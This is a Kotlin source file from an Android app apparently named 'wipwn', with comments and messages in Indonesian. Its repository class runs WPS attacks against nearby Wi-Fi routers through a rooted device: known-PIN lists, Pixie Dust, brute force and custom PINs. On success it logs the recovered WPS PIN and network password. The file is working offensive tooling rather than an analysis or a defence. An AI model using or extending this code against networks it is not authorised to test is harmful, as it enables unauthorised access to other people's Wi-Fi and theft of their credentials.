package com.wipwn.app.repository

import android.content.Context
import android.os.SystemClock
import com.wipwn.app.data.AttackConfig
import com.wipwn.app.data.AttackError
import com.wipwn.app.data.AttackHistoryStore
import com.wipwn.app.data.AttackResult
import com.wipwn.app.data.AttackType
import com.wipwn.app.data.WifiNetwork
import com.wipwn.app.util.RootUtil
import com.wipwn.app.util.ShellExecutor
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asSharedFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeoutOrNull
import kotlinx.coroutines.withContext
import kotlinx.coroutines.sync.Mutex
import sangiorgi.wps.lib.ConnectionUpdateCallback
import sangiorgi.wps.lib.WpsConnectionManager
import sangiorgi.wps.lib.models.NetworkToTest
import kotlin.coroutines.resume

/**
 * Central business-logic layer. Replaces the monolithic ViewModel: every
 * screen-level VM talks to this repository instead of touching the library,
 * shell or DataStore directly.
 *
 * Lifecycle: created once in [com.wipwn.app.WipwnApp] and shared across all
 * ViewModels. [shutdown] is not called by the app (matches
 * [android.app.Application] lifetime) but is available for tests.
 */
class WpsRepository(
    private val appContext: Context,
    private val shell: ShellExecutor,
    private val historyStore: AttackHistoryStore,
    private val scope: CoroutineScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
) {
    private val attackLock = Mutex()
    private val scanner = WifiScanner(appContext)
    private val envPreparer = EnvironmentPreparer(appContext, shell) { log -> emitEvent(AttackEvent.Log(log)) }
    private val pixieInstrumentation = PixieDustInstrumentation(shell) { stage, msg -> emitTaggedLog(stage, msg) }
    // ── Init state ─────────────────────────────────────────────────────

    data class InitState(
        val isRooted: Boolean = false,
        val isChecking: Boolean = true,
        val isLibraryReady: Boolean = false,
        val error: String? = null
    )

    private val _initState = MutableStateFlow(InitState())
    val initState: StateFlow<InitState> = _initState.asStateFlow()

    // ── Cross-screen selection ─────────────────────────────────────────

    private val _selectedNetwork = MutableStateFlow<WifiNetwork?>(null)
    val selectedNetwork: StateFlow<WifiNetwork?> = _selectedNetwork.asStateFlow()

    fun selectNetwork(network: WifiNetwork) { _selectedNetwork.value = network }
    fun clearSelection() { _selectedNetwork.value = null }

    // ── Persistent history ─────────────────────────────────────────────

    val history: Flow<List<AttackResult>> = historyStore.history

    // ── WPS library ────────────────────────────────────────────────────

    private var wpsManager: WpsConnectionManager? = null

    /** Probe root + initialise the WPS library. Re-runnable (retry). */
    fun initialize() {
        scope.launch { doInitialize() }
    }

    private suspend fun doInitialize() {
        _initState.value = InitState(isChecking = true)

        val rooted = withContext(Dispatchers.IO) { RootUtil.isRooted() }
        if (!rooted) {
            _initState.value = InitState(
                isRooted = false,
                isChecking = false,
                error = "Perangkat tidak memiliki akses root!"
            )
            return
        }

        try {
            val manager = WpsConnectionManager(appContext)
            withContext(Dispatchers.IO) {
                manager.initialize().get()
                manager.awaitReady()
            }
            wpsManager = manager
            _initState.value = InitState(
                isRooted = true,
                isChecking = false,
                isLibraryReady = true
            )
        } catch (e: Exception) {
            _initState.value = InitState(
                isRooted = true,
                isChecking = false,
                isLibraryReady = false,
                error = "Gagal inisialisasi WPS library: ${e.message}"
            )
        }
    }

    // ── Scanning ───────────────────────────────────────────────────────

    suspend fun scanNetworks(): Result<List<WifiNetwork>> = scanner.scan()

    // ── Attacks ────────────────────────────────────────────────────────

    /**
     * Events emitted during an attack. Exposed as a SharedFlow so multiple
     * VMs / UI pieces can subscribe without replays interfering.
     */
    sealed interface AttackEvent {
        data class Log(val line: String) : AttackEvent
        data class Progress(val message: String, val totalPins: Int) : AttackEvent
        data class PinCountDelta(val delta: Int) : AttackEvent
        data class SessionStarted(val sessionId: String) : AttackEvent
        data class Finished(val result: AttackResult) : AttackEvent
    }

    private val _attackEvents = MutableSharedFlow<AttackEvent>(
        replay = 0,
        extraBufferCapacity = 128
    )
    val attackEvents: kotlinx.coroutines.flow.SharedFlow<AttackEvent> = _attackEvents.asSharedFlow()

    /**
     * Run an attack. Suspends until finished. Guaranteed to emit exactly one
     * [AttackEvent.Finished] before returning.
     */
    suspend fun runAttack(
        network: WifiNetwork,
        type: AttackType,
        customPin: String? = null,
        config: AttackConfig = AttackConfig()
    ): AttackResult {
        val sessionId = "S-${System.currentTimeMillis()}"
        _attackEvents.emit(AttackEvent.SessionStarted(sessionId))
        emitTaggedLog("guard", "Session: $sessionId")

        if (!attackLock.tryLock()) {
            val busy = AttackResult(
                bssid = network.bssid,
                ssid = network.ssid,
                success = false,
                error = AttackError.Unknown("Masih ada serangan aktif, tunggu sampai selesai")
            )
            _attackEvents.emit(AttackEvent.Finished(busy))
            historyStore.add(busy)
            return busy
        }

        try {
            ensureAttackPrerequisites()?.let { guardError ->
                val blocked = AttackResult(
                    bssid = network.bssid,
                    ssid = network.ssid,
                    success = false,
                    error = guardError
                )
                _attackEvents.emit(AttackEvent.Finished(blocked))
                historyStore.add(blocked)
                return blocked
            }

            val manager = wpsManager ?: run {
                val r = AttackResult(
                    bssid = network.bssid,
                    ssid = network.ssid,
                    success = false,
                    error = AttackError.NoRoot("WPS library belum siap")
                )
                _attackEvents.emit(AttackEvent.Finished(r))
                historyStore.add(r)
                return r
            }

            // Prepare environment
            emitTaggedLog("prepare", "Menyiapkan environment...")
            val prepResult = withContext(Dispatchers.IO) { envPreparer.prepare() }
            if (prepResult is EnvironmentPreparer.EnvPrep.Failed) {
                val r = AttackResult(
                    bssid = network.bssid,
                    ssid = network.ssid,
                    success = false,
                    error = AttackError.EnvironmentFailed(prepResult.reason)
                )
                _attackEvents.emit(AttackEvent.Finished(r))
                historyStore.add(r)
                return r
            }
            val startedAt = SystemClock.elapsedRealtime()
            val result = withTimeoutOrNull(config.attackTimeoutMs) {
                awaitAttack(manager, network, type, customPin, config)
            } ?: run {
                manager.cancel()
                emitTaggedLog("guard", "Watchdog timeout ${config.attackTimeoutMs}ms, cancel attack")
                val timeoutResult = AttackResult(
                    bssid = network.bssid,
                    ssid = network.ssid,
                    success = false,
                    error = AttackError.Unknown("Timeout: serangan terlalu lama, dibatalkan watchdog")
                )
                _attackEvents.emit(AttackEvent.Finished(timeoutResult))
                historyStore.add(timeoutResult)
                timeoutResult
            }
            emitTaggedLog("result", "Session selesai dalam ${SystemClock.elapsedRealtime() - startedAt}ms")
            return result
        } finally {
            // Restore WiFi setelah serangan selesai biar user ga perlu
            // manual toggle WiFi on
            withContext(Dispatchers.IO) {
                runCatching { envPreparer.restoreWifi() }
            }
            attackLock.unlock()
        }
    }

    private suspend fun awaitAttack(
        manager: WpsConnectionManager,
        network: WifiNetwork,
        type: AttackType,
        customPin: String?,
        config: AttackConfig
    ): AttackResult = suspendCancellableCoroutine { cont ->
        val finished = java.util.concurrent.atomic.AtomicBoolean(false)
        val sideJobs = mutableListOf<Job>()
        val logcatProcRef = java.util.concurrent.atomic.AtomicReference<Process?>(null)

        fun stopSideJobs() {
            sideJobs.forEach { it.cancel() }
            sideJobs.clear()
            logcatProcRef.getAndSet(null)?.let { p ->
                runCatching { p.destroy() }
            }
        }

        fun finish(r: AttackResult) {
            if (!finished.compareAndSet(false, true)) return
            stopSideJobs()
            scope.launch {
                _attackEvents.emit(AttackEvent.Finished(r))
                historyStore.add(r)
            }
            if (cont.isActive) cont.resume(r)
        }

        cont.invokeOnCancellation {
            finished.set(true)
            stopSideJobs()
            runCatching { manager.cancel() }
        }

        val callback = object : ConnectionUpdateCallback {
            override fun create(title: String, message: String, progress: Int) {
                emitTaggedLog("run", "▶ $message")
                emitEvent(AttackEvent.Progress(message, progress))
            }
            override fun updateMessage(message: String) {
                emitTaggedLog("run", "  $message")
                emitEvent(AttackEvent.Progress(message, -1))
            }
            override fun updateCount(increment: Int) {
                emitEvent(AttackEvent.PinCountDelta(increment))
            }
            override fun error(message: String, type: Int) {
                val err = AttackError.fromLibraryErrorType(type, message)
                emitTaggedLog("result", "✗ ${err.message}")
                finish(
                    AttackResult(
                        bssid = network.bssid,
                        ssid = network.ssid,
                        success = false,
                        error = err
                    )
                )
            }
            override fun success(networkToTest: NetworkToTest, isRoot: Boolean) {
                val pin = networkToTest.pins?.firstOrNull()
                val pass = networkToTest.password
                emitTaggedLog("result", "✓ BERHASIL! PIN: ${pin ?: "-"}")
                if (!pass.isNullOrEmpty()) emitTaggedLog("result", "✓ Password: $pass")
                finish(
                    AttackResult(
                        bssid = network.bssid,
                        ssid = network.ssid,
                        pin = pin,
                        password = pass,
                        success = true
                    )
                )
            }
            override fun onPixieDustSuccess(pin: String, password: String) {
                emitTaggedLog("pixie", "✓ Pixie Dust BERHASIL!")
                emitTaggedLog("pixie", "✓ PIN: $pin")
                if (password.isNotEmpty()) emitTaggedLog("pixie", "✓ Password: $password")
                finish(
                    AttackResult(
                        bssid = network.bssid,
                        ssid = network.ssid,
                        pin = pin,
                        password = password,
                        success = true
                    )
                )
            }
            override fun onPixieDustFailure(error: String) {
                emitTaggedLog("pixie", "✗ Pixie Dust gagal: $error")
                finish(
                    AttackResult(
                        bssid = network.bssid,
                        ssid = network.ssid,
                        success = false,
                        error = AttackError.PixieDustNotVulnerable(error)
                    )
                )
            }
        }

        if (type == AttackType.PIXIE_DUST) {
            pixieInstrumentation.narratePlan(network)
            sideJobs += scope.launch { pixieInstrumentation.heartbeat() }
            sideJobs += scope.launch { pixieInstrumentation.tailLogcat(logcatProcRef) }
        }

        scope.launch {
            runCatching {
                when (type) {
                    AttackType.KNOWN_PINS -> manager.testPins(
                        network.bssid, network.ssid, config.knownPins.toTypedArray(), callback
                    )
                    AttackType.PIXIE_DUST -> manager.pixieDust(
                        network.bssid, network.ssid, callback
                    )
                    AttackType.BRUTE_FORCE -> manager.bruteForce(
                        network.bssid, network.ssid, config.bruteForceDelayMs, callback
                    )
                    AttackType.CUSTOM_PIN -> {
                        val pin = customPin ?: return@runCatching
                        manager.testPins(network.bssid, network.ssid, arrayOf(pin), callback)
                    }
                }
            }.onFailure { e ->
                finish(
                    AttackResult(
                        bssid = network.bssid,
                        ssid = network.ssid,
                        success = false,
                        error = AttackError.Unknown("Exception: ${e.message}", e)
                    )
                )
            }
        }
    }

    private fun emitEvent(event: AttackEvent) {
        // tryEmit is safe because we have extraBufferCapacity.
        _attackEvents.tryEmit(event)
    }

    private fun emitTaggedLog(stage: String, message: String) {
        emitEvent(AttackEvent.Log("[${stage.lowercase()}] $message"))
    }

    fun cancelAttack() {
        wpsManager?.cancel()
    }

    suspend fun clearHistory() = historyStore.clear()

    fun shutdown() {
        wpsManager?.cleanup()
        wpsManager?.shutdown()
        wpsManager = null
    }

    private suspend fun ensureAttackPrerequisites(): AttackError? {
        if (!_initState.value.isLibraryReady) {
            return AttackError.NoRoot("Library WPS belum siap.")
        }
        return runCatching {
            scanner.ensurePrerequisites()
            null
        }.getOrElse { AttackError.EnvironmentFailed(it.message ?: "Prerequisite gagal") }
    }
}
